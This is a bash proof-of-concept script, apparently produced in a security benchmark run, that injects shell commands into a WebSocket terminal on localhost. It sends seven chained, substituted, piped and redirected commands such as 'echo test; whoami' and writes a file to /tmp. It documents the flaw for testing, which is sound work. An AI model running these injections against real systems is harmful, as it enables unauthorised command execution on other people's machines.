#!/bin/bash
# POC: Demonstrates command injection vulnerability in WebSocket terminal by executing multiple commands through shell metacharacters
# Target: ./repo
# Created: 2025-11-07T18:28:55.048Z
# Session: benchmark-XBEN-097-24-mhp6l4fm

# WebSocket Command Injection POC
# Demonstrates that WebSocket terminal accepts and executes arbitrary shell commands
# with metacharacters including command chaining, substitution, and redirection

TARGET_URL="ws://localhost:22222/ws"
TIMEOUT=5

# Function to send WebSocket command and capture response
send_websocket_command() {
    local command="$1"
    local description="$2"
    
    echo "[*] Testing: $description"
    echo "[*] Command: $command"
    
    # Use websocat or wscat if available, otherwise use Python
    if command -v websocat &> /dev/null; then
        response=$(echo "$command" | timeout $TIMEOUT websocat "$TARGET_URL" 2>&1 || true)
    elif command -v wscat &> /dev/null; then
        response=$(echo "$command" | timeout $TIMEOUT wscat -c "$TARGET_URL" 2>&1 || true)
    else
        # Fallback: Use Python with websocket-client library
        python3 << PYTHON_EOF
import sys
import json
try:
    from websocket import create_connection
    import time
    
    ws = create_connection("$TARGET_URL", timeout=$TIMEOUT)
    ws.send("$command")
    time.sleep(0.5)
    try:
        response = ws.recv()
        print(response, end='')
    except:
        pass
    ws.close()
except Exception as e:
    print(f"Error: {e}", file=sys.stderr)
PYTHON_EOF
        response=$?
    fi
    
    echo "[*] Response:"
    echo "$response"
    echo ""
    echo "---"
    echo ""
}

echo "========================================"
echo "WebSocket Terminal Command Injection POC"
echo "========================================"
echo ""
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Command chaining with semicolon
send_websocket_command "echo test; whoami" "Command Chaining with Semicolon"

# Test 2: Command substitution
send_websocket_command "echo \$(whoami)" "Command Substitution"

# Test 3: Pipe operator
send_websocket_command "whoami | cat" "Pipe Operator"

# Test 4: Output redirection
send_websocket_command "echo injected > /tmp/ws_injection_test.txt && cat /tmp/ws_injection_test.txt" "Output Redirection and File Writing"

# Test 5: Command AND operator
send_websocket_command "whoami && id" "AND Operator (&&)"

# Test 6: Command OR operator
send_websocket_command "false || whoami" "OR Operator (||)"

# Test 7: Background execution
send_websocket_command "sleep 1 &" "Background Command Execution"

echo "[+] POC Complete"